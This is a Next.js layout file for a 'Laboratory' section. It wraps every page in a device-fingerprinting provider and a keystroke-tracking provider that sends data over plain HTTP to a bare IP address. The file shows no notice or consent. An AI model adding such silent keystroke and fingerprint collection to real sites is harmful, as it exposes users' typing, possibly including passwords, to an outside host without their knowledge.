// app/layout.tsx
import "@/styles/globals.css"
import { KeystrokeProvider } from '@/app/components/KeystrokeTrackerProvider';

import type React from "react"
import { DeviceFingerprintProvider } from "@/app/components/DeviceFingerprintProvider";

export const metadata = {
  title: 'Laboratory',
  description: 'Laboratory section'
};

export default function NoLayoutForLaboratory({ children }: { children: React.ReactNode }) {
  return (
    <>
      <DeviceFingerprintProvider>
        <KeystrokeProvider apiEndpoint="http://157.180.39.110:5000/receive-json">
          {children}
        </KeystrokeProvider>
      </DeviceFingerprintProvider>

    </>
  );
}